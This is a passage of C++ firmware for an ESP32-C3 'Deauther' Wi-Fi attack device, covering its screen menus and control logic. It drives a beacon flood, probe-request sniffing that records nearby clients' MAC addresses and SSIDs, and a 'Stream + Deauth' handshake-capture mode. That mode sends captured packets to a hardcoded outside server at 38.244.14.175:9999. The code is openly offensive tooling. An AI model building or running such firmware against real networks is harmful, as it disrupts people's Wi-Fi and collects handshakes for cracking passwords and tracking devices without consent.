  std::string ch_info = "Channel: " + std::to_string(w_utils_->getCurrentChannel());
  display_->drawText(ch_info.c_str(), 4, 36, 1, ST77XX_YELLOW);

  display_->drawText("[1]Nav [2x]Sel [H]Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

void Mainwindow::handleSnifferPageNav()
{
  int item_count = 5;
  cursor_index = (cursor_index + 1) % item_count;
  setSnifferPage();
}

void Mainwindow::handleSnifferPageSel()
{
  switch (cursor_index) {
    case 0:  // Start sniffer on target channel
      {
        stopAllActivities();
        uint8_t ch = (selected_target >= 0) ? w_utils_->wifi_list.channel[selected_target] : 6;
        sniffer_active = true;
        w_utils_->resetSnifferStats();
        w_utils_->startSniffer(ch);
        web_server_->setSnifferRunning(true);
        web_server_->setSnifferChannel(ch);
        Serial.printf("[SNIFFER] Started on ch %d\n", ch);
      }
      break;
    case 1:  // Channel hopper
      {
        stopAllActivities();
        sniffer_active = true;
        channel_hopping = true;
        w_utils_->resetSnifferStats();
        w_utils_->startSniffer(1);
        w_utils_->startChannelHopper();
        web_server_->setSnifferRunning(true);
        web_server_->setSnifferChannel(1);
        web_server_->setChannelHopping(true);
      }
      break;
    case 2:  // Full channel scan with hopper
      {
        stopAllActivities();
        sniffer_active = true;
        channel_hopping = true;
        w_utils_->resetSnifferStats();
        w_utils_->startSniffer(1);
        w_utils_->startChannelHopper();
        web_server_->setSnifferRunning(true);
        web_server_->setChannelHopping(true);
      }
      break;
    case 3:  // Stream to server
      startStreaming();
      break;
    case 4:  // Back
      handleBack();
      break;
  }
}

void Mainwindow::updateSnifferDisplay()
{
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  display_->drawText("Sniffer", 100, 2, 2, ST77XX_WHITE);

  snifferStats stats = w_utils_->getSnifferStats();

  // Channel info
  std::string ch_str = "Channel: " + std::to_string(w_utils_->getCurrentChannel());
  if (channel_hopping) ch_str += " (hop)";
  display_->drawText(ch_str.c_str(), 4, 36, 1, ST77XX_YELLOW);

  // Filter status
  std::string filter_str;
  if (w_utils_->isSnifferFiltered()) {
    char mac_buf[18];
    w_utils_->getSnifferFilterMacStr(mac_buf, sizeof(mac_buf));
    filter_str = "Filter: " + std::string(mac_buf);
    display_->drawText(filter_str.c_str(), 4, 50, 1, ST77XX_GREEN);
  } else {
    display_->drawText("Filter: ALL", 4, 50, 1, ST77XX_CYAN);
  }

  // Frame counts
  std::string mgmt = "Mgmt: " + std::to_string(stats.mgmt_frames);
  display_->drawText(mgmt.c_str(), 4, 66, 1, ST77XX_WHITE);

  std::string data = "Data: " + std::to_string(stats.data_frames);
  display_->drawText(data.c_str(), 4, 82, 1, ST77XX_WHITE);

  std::string ctrl = "Ctrl: " + std::to_string(stats.ctrl_frames);
  display_->drawText(ctrl.c_str(), 4, 98, 1, ST77XX_WHITE);

  std::string probe = "Probe: " + std::to_string(stats.probe_req_frames);
  display_->drawText(probe.c_str(), 4, 114, 1, ST77XX_WHITE);

  std::string total = "Total: " + std::to_string(stats.total_frames);
  display_->drawText(total.c_str(), 4, 130, 1, ST77XX_GREEN);

  // Last frame info
  if (stats.total_frames > 0) {
    std::string src = "Src MAC: " + stats.last_src_mac;
    tft.setTextSize(1);
    tft.setTextColor(ST77XX_WHITE);
    tft.setCursor(4, 148);
    tft.print(src.c_str());

    std::string dst = "Dst MAC: " + stats.last_dst_mac;
    tft.setCursor(4, 164);
    tft.print(dst.c_str());
  }

  // Stop option
  tft.fillRect(4, 180, 312, 16, ST77XX_RED);
  display_->drawText("Stop Sniff", L_ITEM_X, 182, 1, ST77XX_WHITE);

  display_->drawText("[H] Stop & Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

// ============== BEACON FLOOD PAGE ==============

void Mainwindow::handleBeaconPage(int action)
{
  if (beacon_active) {
    if (action == BTN_BACK || action == BTN_SEL) {
      stopAllActivities();
      setBeaconPage();
    }
    return;
  }
  switch (action) {
    case BTN_NAV:  handleBeaconPageNav(); break;
    case BTN_SEL:  handleBeaconPageSel(); break;
    case BTN_BACK: handleBack(); break;
  }
}

void Mainwindow::setBeaconPage()
{
  page = PAGE_BEACON;
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  display_->drawText("Beacon Flood", 70, 2, 2, ST77XX_RED);

  if (selected_target >= 0) {
    std::string tgt = "Target: " + w_utils_->wifi_list.ssid[selected_target];
    if (tgt.length() > 40) tgt = tgt.substr(0, 40);
    display_->drawText(tgt.c_str(), 4, 36, 1, ST77XX_YELLOW);
  }

  const char* beacon_items[] = {"Start Flood", "Back"};
  int item_count = 2;
  tft.setTextSize(1);
  for (int i = 0; i < item_count; i++) {
    int y = L_MENU_Y + i * L_MENU_STEP;
    tft.setCursor(L_ARROW_X, y);
    if (i == cursor_index) {
      tft.setTextColor(ST77XX_WHITE);
      tft.print(">");
      display_->drawText(beacon_items[i], L_ITEM_X, y, 1, ST77XX_WHITE);
    } else {
      tft.setTextColor(ST77XX_CYAN);
      tft.print(" ");
      display_->drawText(beacon_items[i], L_ITEM_X, y, 1, ST77XX_CYAN);
    }
  }

  display_->drawText("[1]Nav [2x]Sel [H]Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

void Mainwindow::handleBeaconPageNav()
{
  cursor_index = (cursor_index + 1) % 2;
  setBeaconPage();
}

void Mainwindow::handleBeaconPageSel()
{
  switch (cursor_index) {
    case 0:  // Start Flood
      if (selected_target >= 0) {
        stopAllActivities();
        beacon_active = true;
        w_utils_->startBeaconFlood(w_utils_->wifi_list.channel[selected_target]);
        web_server_->setBeaconRunning(true);
        web_server_->setBeaconChannel(w_utils_->wifi_list.channel[selected_target]);
      }
      break;
    case 1:  // Back
      handleBack();
      break;
  }
}

void Mainwindow::updateBeaconDisplay()
{
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  display_->drawText("Beacon Flood", 70, 2, 2, ST77XX_RED);

  if (selected_target >= 0) {
    std::string tgt = "Target: " + w_utils_->wifi_list.ssid[selected_target];
    if (tgt.length() > 20) tgt = tgt.substr(0, 20);
    display_->drawText(tgt.c_str(), 4, 36, 1, ST77XX_YELLOW);
  }

  uint32_t count = w_utils_->getBeaconFloodCount();
  std::string sent = "Sent: " + std::to_string(count) + " frames";
  display_->drawText(sent.c_str(), 4, 56, 2, ST77XX_GREEN);

  uint8_t ch = (selected_target >= 0) ? w_utils_->wifi_list.channel[selected_target] : 1;
  std::string ch_str = "Channel: " + std::to_string(ch);
  display_->drawText(ch_str.c_str(), 4, 92, 1, ST77XX_WHITE);

  tft.fillRect(4, 120, 312, 16, ST77XX_RED);
  display_->drawText("Stop Flood", L_ITEM_X, 122, 1, ST77XX_WHITE);

  display_->drawText("[2x/H] Stop", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

// ============== PROBE REQUEST PAGE ==============

void Mainwindow::handleProbePage(int action)
{
  if (probe_active) {
    if (action == BTN_BACK) {
      stopAllActivities();
      setProbePage();
    }
    return;
  }
  switch (action) {
    case BTN_NAV:  handleProbePageNav(); break;
    case BTN_SEL:  handleProbePageSel(); break;
    case BTN_BACK: handleBack(); break;
  }
}

void Mainwindow::setProbePage()
{
  page = PAGE_PROBE;
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  display_->drawText("Probe Request", 70, 2, 2, ST77XX_WHITE);

  const char* probe_items[] = {"Start", "Channel Hop", "Back"};
  int item_count = 3;
  tft.setTextSize(1);
  for (int i = 0; i < item_count; i++) {
    int y = L_MENU_Y + i * L_MENU_STEP;
    tft.setCursor(L_ARROW_X, y);
    if (i == cursor_index) {
      tft.setTextColor(ST77XX_WHITE);
      tft.print(">");
      display_->drawText(probe_items[i], L_ITEM_X, y, 1, ST77XX_WHITE);
    } else {
      tft.setTextColor(ST77XX_CYAN);
      tft.print(" ");
      display_->drawText(probe_items[i], L_ITEM_X, y, 1, ST77XX_CYAN);
    }
  }

  display_->drawText("[1]Nav [2x]Sel [H]Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

void Mainwindow::handleProbePageNav()
{
  cursor_index = (cursor_index + 1) % 3;
  setProbePage();
}

void Mainwindow::handleProbePageSel()
{
  switch (cursor_index) {
    case 0:  // Start
      {
        stopAllActivities();
        uint8_t ch = (selected_target >= 0) ? w_utils_->wifi_list.channel[selected_target] : 6;
        probe_active = true;
        w_utils_->resetProbeData();
        w_utils_->startProbeSniffer(ch);
        web_server_->setProbeRunning(true);
        web_server_->setProbeChannel(ch);
      }
      break;
    case 1:  // Channel Hop
      {
        stopAllActivities();
        probe_active = true;
        channel_hopping = true;
        w_utils_->resetProbeData();
        w_utils_->startProbeSniffer(1);
        w_utils_->startChannelHopper();
        web_server_->setProbeRunning(true);
        web_server_->setProbeChannel(1);
        web_server_->setChannelHopping(true);
      }
      break;
    case 2:  // Back
      handleBack();
      break;
  }
}

void Mainwindow::updateProbeDisplay()
{
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  display_->drawText("Probe Request", 70, 2, 2, ST77XX_WHITE);

  probeData pdata = w_utils_->getProbeData();

  std::string ch_str = "Channel: " + std::to_string(w_utils_->getCurrentChannel());
  if (channel_hopping) ch_str += " (hop)";
  display_->drawText(ch_str.c_str(), 4, 36, 1, ST77XX_YELLOW);

  std::string count_str = "Clients: " + std::to_string(pdata.num);
  display_->drawText(count_str.c_str(), 4, 52, 1, ST77XX_GREEN);

  // Show probe request entries (up to 8)
  int row_y = 70;
  int max_show = min(pdata.num, 8);
  for (int i = 0; i < max_show; i++) {
    tft.setTextSize(1);
    tft.setTextColor(ST77XX_WHITE);
    tft.setCursor(4, row_y);
    std::string line = pdata.client_mac[i];
    if (pdata.ssid[i].length() > 0) {
      line += " " + pdata.ssid[i];
    }
    if (line.length() > 45) line = line.substr(0, 45);
    tft.print(line.c_str());
    row_y += 14;
  }

  // Stop option
  tft.fillRect(4, 180, 312, 16, ST77XX_RED);
  display_->drawText("Stop", L_ITEM_X, 182, 1, ST77XX_WHITE);

  display_->drawText("[H] Stop & Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

// ============== INFO PAGE ==============

void Mainwindow::handleInfoPage(int action)
{
  handleBack();  // Any button returns to main
}

void Mainwindow::setInfoPage()
{
  cursor_index = 0;
  page = PAGE_INFO;
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  display_->drawText("Device Info", 80, 2, 2, ST77XX_WHITE);

  display_->drawText("LCKFB ESP32-C3", 4, 40, 1, ST77XX_RED);
  display_->drawText("Deauther", 4, 56, 2, ST77XX_WHITE);

  display_->drawText("AP: DeautherC3", 4, 92, 1, ST77XX_GREEN);
  display_->drawText("IP: 192.168.4.1", 4, 108, 1, ST77XX_GREEN);

  std::string mac_str = "MAC: " + w_utils_->macAddress();
  tft.setTextSize(1);
  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(4, 124);
  tft.print(mac_str.c_str());

  display_->drawText("FW: v1.0", 4, 140, 1, ST77XX_WHITE);
  display_->drawText("HW: ESP32-C3", 4, 156, 1, ST77XX_WHITE);
  display_->drawText("Open Source", 4, 172, 1, ST77XX_CYAN);

  display_->drawText("[Any] Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

// ============== STREAMER PAGE ==============

void Mainwindow::startStreaming()
{
  // No target required - streaming captures ALL packets on channel

  // Check WiFi STA status - must have internet to reach server
  bool sta_ok = (WiFi.status() == WL_CONNECTED);
  if (!sta_ok) {
    Serial.println("[STREAM] WiFi STA not connected! Cannot stream to server.");
    Serial.println("[STREAM] Please configure WiFi via Web UI: 192.168.4.1/config");
    // Show warning on screen
    Adafruit_ST7789& tft = display_->getTft();
    tft.fillScreen(ST77XX_BLACK);
    display_->drawText("WiFi Not Connected!", 20, 50, 2, ST77XX_RED);
    display_->drawText("Configure at:", 4, 90, 1, ST77XX_WHITE);
    display_->drawText("192.168.4.1/config", 4, 108, 1, ST77XX_GREEN);
    display_->drawText("[H] Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
    delay(3000);
    return;
  }

  Serial.printf("[STREAM] WiFi STA OK, IP: %s\n", WiFi.localIP().toString().c_str());

  // Start sniffer if not already running
  if (!sniffer_active) {
    // CRITICAL: Stay on STA's channel so the WiFi connection doesn't drop!
    // ESP32-C3 has a single radio - it cannot be on two channels at once.
    // If we channel-hop (1-13), the STA connection to the router WILL drop.
    uint8_t sta_channel = 0;
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
      sta_channel = ap_info.primary;
      Serial.printf("[STREAM] STA is on channel %d, fixing sniffer to same channel\n", sta_channel);
    }
    // Fallback to common channel 6
    uint8_t sniffer_ch = (sta_channel > 0) ? sta_channel : 6;

    sniffer_active = true;
    channel_hopping = false;  // NO hopping while streaming - keep STA alive!
    w_utils_->resetSnifferStats();
    w_utils_->startSniffer(sniffer_ch);
    web_server_->setSnifferRunning(true);
    web_server_->setSnifferChannel(sniffer_ch);
    Serial.printf("[STREAM] Sniffer started on fixed channel %d (no hopping)\n", sniffer_ch);
  }

  // Start streaming (connection handled async in loop to avoid blocking)
  streaming_active = true;
  web_server_->setStreamingRunning(true);  // Sync web state so syncWebState() doesn't kill it

  // Apply BSSID filter if a target network is selected
  if (selected_target >= 0 && selected_target < w_utils_->wifi_list.num) {
    const std::string& bssid_str = w_utils_->wifi_list.bssid[selected_target];
    uint8_t bssid[6];
    // Parse "AA:BB:CC:DD:EE:FF" → bytes
    int parsed = sscanf(bssid_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                        &bssid[0], &bssid[1], &bssid[2],
                        &bssid[3], &bssid[4], &bssid[5]);
    if (parsed == 6) {
      streamer_->setFilterBSSID(bssid);
      Serial.printf("[STREAM] Filtering for BSSID: %s\n", bssid_str.c_str());
    }
  } else {
    streamer_->clearFilter();
    Serial.println("[STREAM] No target selected - streaming ALL packets");
  }

  page = PAGE_SNIFFER;  // Use sniffer page context
  updateStreamerDisplay();
  Serial.println("[STREAM] Packet streaming started - will connect async via loop()");
}

void Mainwindow::stopStreaming()
{
  streaming_active = false;
  web_server_->setStreamingRunning(false);  // Sync web state
  streamer_->clearFilter();                 // Remove BSSID filter
  streamer_->disconnect();
  Serial.printf("[STREAM] Stopped. Sent: %lu packets\n", streamer_->getPacketsSent());
}

void Mainwindow::updateStreamerDisplay()
{
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  display_->drawText("Packet Stream", 70, 2, 2, ST77XX_GREEN);

  // Connection status
  std::string conn_status;
  uint16_t status_color;
  if (streamer_->isConnected()) {
    conn_status = "Connected";
    status_color = ST77XX_GREEN;
  } else {
    // Check if WiFi STA is the issue
    if (WiFi.status() != WL_CONNECTED) {
      conn_status = "WiFi Not Connected!";
      status_color = ST77XX_RED;
    } else {
      conn_status = "Reconnecting...";
      status_color = ST77XX_YELLOW;
    }
  }
  display_->drawText(conn_status.c_str(), 4, 36, 1, status_color);

  // Server info
  display_->drawText("Server: 38.244.14.175:9999", 4, 52, 1, ST77XX_WHITE);

  // Filter status
  if (streamer_->isFilterActive() && selected_target >= 0 &&
      selected_target < w_utils_->wifi_list.num) {
    std::string fstr = "Net: " + w_utils_->wifi_list.bssid[selected_target];
    display_->drawText(fstr.c_str(), 4, 68, 1, ST77XX_MAGENTA);
  } else if (w_utils_->isSnifferFiltered()) {
    char mac_buf[18];
    w_utils_->getSnifferFilterMacStr(mac_buf, sizeof(mac_buf));
    std::string fstr = "Dev: " + std::string(mac_buf);
    display_->drawText(fstr.c_str(), 4, 68, 1, ST77XX_GREEN);
  } else {
    display_->drawText("Filter: ALL nets", 4, 68, 1, ST77XX_CYAN);
  }

  // Stats
  uint32_t sent = streamer_->getPacketsSent();
  uint32_t dropped = streamer_->getPacketsDropped();
  int buf_count = streamer_->getBufferCount();

  std::string sent_str = "Sent: " + std::to_string(sent) + " pkts";
  display_->drawText(sent_str.c_str(), 4, 86, 1, ST77XX_CYAN);

  std::string drop_str = "Dropped: " + std::to_string(dropped);
  display_->drawText(drop_str.c_str(), 4, 102, 1, ST77XX_RED);

  std::string buf_str = "Buffer: " + std::to_string(buf_count);
  display_->drawText(buf_str.c_str(), 4, 118, 1, ST77XX_WHITE);

  // Sniffer stats overlay
  snifferStats stats = w_utils_->getSnifferStats();
  std::string total_str = "Total Captured: " + std::to_string(stats.total_frames);
  display_->drawText(total_str.c_str(), 4, 134, 1, ST77XX_YELLOW);

  // Channel info
  std::string ch_str = "Channel: " + std::to_string(w_utils_->getCurrentChannel());
  if (channel_hopping) {
    ch_str += " (hop)";
  } else {
    ch_str += " (fixed)";
  }
  display_->drawText(ch_str.c_str(), 4, 150, 1, ST77XX_WHITE);

  // Stop button
  tft.fillRect(4, 180, 312, 16, ST77XX_RED);
  display_->drawText("Stop Stream", L_ITEM_X, 182, 1, ST77XX_WHITE);

  display_->drawText("[2x]Deauth [H]Stop", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

// === Combined Stream+Deauth Display (handshake capture mode) ===
void Mainwindow::updateStreamerDeauthDisplay()
{
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  // Title: combined mode indicator
  display_->drawText("Stream + Deauth", 50, 2, 2, ST77XX_RED);

  // === Deauth section ===
  if (selected_target >= 0 && selected_target < w_utils_->wifi_list.num) {
    std::string ssid = w_utils_->wifi_list.ssid[selected_target];
    if (ssid.length() > 22) ssid = ssid.substr(0, 22);
    std::string tgt = "T:" + ssid;
    display_->drawText(tgt.c_str(), 4, 34, 1, ST77XX_WHITE);
  }
  std::string pkts = "Deauth: " + std::to_string(attack_packet_count) + " pkts";
  display_->drawText(pkts.c_str(), 4, 50, 1, ST77XX_RED);

  // === Streamer section ===
  // TCP connection status
  std::string conn_status;
  uint16_t status_color;
  if (streamer_->isConnected()) {
    conn_status = "TCP: Connected";
    status_color = ST77XX_GREEN;
  } else if (WiFi.status() != WL_CONNECTED) {
    conn_status = "TCP: WiFi Lost!";
    status_color = ST77XX_RED;
  } else {
    conn_status = "TCP: Reconnecting";
    status_color = ST77XX_YELLOW;
  }
  display_->drawText(conn_status.c_str(), 4, 70, 1, status_color);

  uint32_t sent = streamer_->getPacketsSent();
  std::string sent_str = "Sent: " + std::to_string(sent) + " pkts";
  display_->drawText(sent_str.c_str(), 4, 86, 1, ST77XX_CYAN);

  // Captured frames stats
  snifferStats stats = w_utils_->getSnifferStats();
  std::string cap_str = "Captured: " + std::to_string(stats.total_frames);
  display_->drawText(cap_str.c_str(), 4, 102, 1, ST77XX_YELLOW);

  // Data frames (potential EAPOL handshakes)
  std::string data_str = "Data frames: " + std::to_string(stats.data_frames);
  display_->drawText(data_str.c_str(), 4, 118, 1, ST77XX_MAGENTA);

  // Filter status
  if (streamer_->isFilterActive()) {
    display_->drawText("Filter: target BSSID", 4, 138, 1, ST77XX_MAGENTA);
  } else {
    display_->drawText("Filter: ALL nets", 4, 138, 1, ST77XX_CYAN);
  }

  // Channel
  uint8_t ch = w_utils_->getCurrentChannel();
  std::string ch_str = "Ch: " + std::to_string(ch) + " (fixed)";
  display_->drawText(ch_str.c_str(), 4, 154, 1, ST77XX_WHITE);

  // Button hints
  display_->drawText("[2x]StopAtk [H]StopAll", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

// ============== HELPER FUNCTIONS ==============

void Mainwindow::parseBSSID(const std::string& bssid_str, uint8_t* out)
{
  for (int i = 0; i < 6; i++) {
    std::string hex = bssid_str.substr(i * 3, 2);
    out[i] = (uint8_t)strtol(hex.c_str(), NULL, 16);
  }
}
